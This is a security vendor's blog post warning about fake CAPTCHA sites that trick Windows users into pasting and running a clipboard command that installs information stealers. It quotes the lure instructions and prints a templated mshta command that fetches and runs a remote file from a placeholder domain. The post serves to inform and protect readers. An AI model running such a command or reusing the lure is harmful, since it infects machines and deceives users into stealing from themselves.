---
title: "Fake CAPTCHA websites hijack your clipboard to install information stealers"
date: 2025-03-19
---

There are more and more sites that use a clipboard hijacker and instruct victims on how to infect their own machine.

I realize that may sound like something trivial to steer clear from, but apparently it’s not because the social engineering behind it is pretty sophisticated.

At first, these attacks were more targeted at people that could provide cybercriminals a foothold at a targeted company, but their popularity has grown so much that now anyone can run into one of them.

It usually starts on a website that promises visitors some kind of popular content: Movies, music, pictures, news articles, you name it.

Nobody will think twice when they are asked to prove they are not a robot.

![content site asking to prove you're not a robot](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/Captcha.jpg)

But the next step in this method isn’t what you would normally see. If you use the checkbox, you’ll be forwarded to something that looks like this:

![instructions to infect yourself](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/clipboard-hijacker.jpg)

> “To better prove you are not a robot, please:
> 
> 1. Press & hold the Windows Key + R.
> 
> 4. In the verification windows, press Ctrl + V.
> 
> 7. Press Enter on your keyboard to finish.  
>     
> 
> You will observe and agree:  
> “I’m not a robot – reCAPTCHA Verification ID: 8253”
> 
> Perform the steps above to finish verification.”

While these instructions may seem harmless enough, if you follow the steps you will actually be infecting yourself with malware—most likely an information stealer. In the background, the website you visited copied a command to your clipboard. In Chromium based browsers (which are almost all the popular ones) a website can only write to your clipboard with your permission. But Windows was under the assumption that you agreed to that when you checked the checkbox in the first screen.

What the obstructions in the prompt are telling you to do is:

1. Open the Run dialog box on Windows.

4. Paste the content of your clipboard into that dialog box.

7. Execute the command you just pasted.

They are not lying about what you will “observe”, but what they don’t tell you is that that’s only the last part of what you pasted, and what you are seeing is not really part of the command but just a comment added behind it.

But under normal circumstances, this is what will be visible.

<figure>

![last part of the pasted content in the Run dialog box](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/run_command.jpg)

<figcaption>

You’ll only see the last part of the pasted content

</figcaption>

</figure>

The first part of what the target was instructed to paste are variations–sometimes obfuscated—of:

```
mshta https://{malicious.domain}/media.file
```

Mshta is a command that will trigger the legitimate Windows executable mshta.exe. But mshta will fetch the malicious media file from the specified domain and run it. The name of the media file may look perfectly fine. We have seen mp3, mp4, jpg, jpeg, swf, html, and there will be other possibilities.

What the files are in reality is an encoded Powershell command which will run invisibly and download the actual payload. For a while, the malware we were seeing downloaded was almost exclusively the Lumma Stealer infostealer, but recently we’ve also found campaigns that use the same method to spread the SecTopRAT. Both of these are designed to steal sensitive data from your machine.

## How to stay safe

There are a few things you can do to protect yourself from falling victim to these and similar methods:

- Do not follow instructions provided by some website you visited without thinking it through.

- Use an active anti-malware solution that blocks malicious websites and scripts.

- Use a browser extension that blocks malicious domains and scams.

- Disable JavaScript in your browser before visiting unknown websites.

The clipboard access is triggered by a JavaScript function document.execCommand(‘copy’).  Disabling JavaScript will stop that from happening, but it has the disadvantage that it will break many websites that you visit regularly. What I do is use different browsers for different purposes.

Here are step-by-step instructions on how to disable JavaScript in several popular browsers:

### How to disable JavaScript in **Chrome**

- Open Chrome and click on the three-dot menu icon in the top right corner.

- Select **Settings** from the dropdown menu.

- On the left side, click on **Privacy and security**.

- Click on **Site setting**s.

- Scroll down to the **Content** section and click on **JavaScript**.

Toggle the switch to **Don’t allow sites to use JavaScript** to **Disable JavaScript for all sites**. You can also add specific sites to block or allow JavaScript by clicking on **Add** under the **Block or Allow** sections.

### How to disable JavaScript in Firefox

- Enter **about:config** into the search bar and select **Accept the Risk and Continue**.

- Enter **javascript.enabled** into the search box at the top of the page.

- Select the **javascript.enabled** toggle to change the value to **false**.

### How to disable JavaScript in Opera

- Launch Opera and click on the settings icon.

- Select **Privacy & Security** from the options.

- Click on **Site Settings**.

- Select the **JavaScript** option.

- Choose **Don’t allow sites to use JavaScript** to disable JavaScript for all sites.

To disable JavaScript for specific sites, click **Add** under the **Not allowed to use JavaScript** section and enter the site’s URL.

### How to disable JavaScript in Edge

- Open Microsoft Edge and click on the three-dot menu icon in the top right corner.

- Select **Settings** from the dropdown menu.

- In the left sidebar, click on **Cookies** and **Site Permissions**.

- Scroll down to the **All Permissions** section and select JavaScript.

Toggle the switch to disable JavaScript. You can also manage JavaScript settings for individual sites by adding them to the allow or block lists.

* * *

**We don’t just report on threats—we remove them**

Cybersecurity risks should never spread beyond a headline. Keep threats off your devices by downloading Malwarebytes today.

Go to Source
